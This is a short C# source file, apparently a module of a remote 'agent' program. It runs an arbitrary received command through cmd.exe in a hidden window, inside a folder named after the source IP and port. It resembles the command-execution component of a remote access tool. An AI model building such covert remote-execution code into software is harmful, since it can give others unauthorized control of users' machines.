using System;
using System.Diagnostics;

namespace Agent.Commands
{
    public class Execute : Command
    {
        public string command { get; set; }

        public override void ExecuteCommand()
        {
            ProcessStartInfo ProcessInfo;
            Process Process;

            string toDir = "cd " + sourceIp + "_" + sourcePort + "\n";
            Console.WriteLine("Executing " + toDir);

            ProcessInfo = new ProcessStartInfo("cmd.exe", "/K " + toDir + command);
            ProcessInfo.CreateNoWindow = true;
            ProcessInfo.UseShellExecute = true;

            Process = Process.Start(ProcessInfo);
        }
    }
}
